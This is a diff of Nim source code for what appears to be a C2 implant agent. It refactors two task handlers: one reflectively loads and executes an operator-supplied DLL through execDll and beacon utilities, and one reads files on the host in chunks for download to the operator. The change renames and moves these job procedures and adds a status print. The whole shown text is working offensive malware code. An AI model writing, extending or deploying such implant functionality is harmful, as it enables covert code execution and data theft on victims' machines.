@@ -252,21 +252,21 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
 
 when ((MODULES and cast[uint32](MODULE_DLL)) == cast[uint32](MODULE_DLL)):
     import ../utils/[rdll, beacon]
-
+    
+    proc dllJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
+        var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
+        let
+            dllName:    string    = unpacker.getDataWithLengthPrefix()
+            dllBytes:   seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
+            exportName: string    = Bytes.toString(task.args[1].data)
+            args:       seq[byte] = Bytes.fromHex(task.args[2].data)
+        
+        print fmt"   [>] Executing DLL {dllName} as a new job."
+        execDll(dllBytes, exportName, args, hWrite, ctx.hWakeupEvent, hStopEvent)
+        
     commands[CMD_DLL] = proc(ctx: AgentCtx, task: Task): TaskResult = 
-
-        proc dllProc(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
-            var unpacker = Unpacker.init(Bytes.toString(task.args[0].data))
-            let
-                dllName:    string    = unpacker.getDataWithLengthPrefix()
-                dllBytes:   seq[byte] = string.toBytes(unpacker.getDataWithLengthPrefix())
-                exportName: string    = Bytes.toString(task.args[1].data)
-                args:       seq[byte] = Bytes.fromHex(task.args[2].data)
-            
-            execDll(dllBytes, exportName, args, hWrite, ctx.hWakeupEvent, hStopEvent)
-            
         try: 
-            if not ctx.startJob(task, dllProc):
+            if not ctx.startJob(task, dllJob):
                 raise newException(CatchableError, GetLastError().getError())
             
             return ctx.createTaskResult(task, STATUS_STARTED, RESULT_NO_OUTPUT, @[])
@@ -279,7 +279,7 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
 
     const DOWNLOAD_CHUNK_SIZE* = 512 * 1024
 
-    proc downloadProc(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
+    proc downloadJob(ctx: AgentCtx, hWrite, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
         let filePath = absolutePath(Bytes.toString(task.args[0].data))
         
         let hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
@@ -307,7 +307,7 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
 
                 let totalSize = getFileSize(filePath)
 
-                if not ctx.startJob(task, downloadProc):
+                if not ctx.startJob(task, downloadJob):
                     raise newException(CatchableError, GetLastError().getError())
 
                 var packer = Packer.init() 
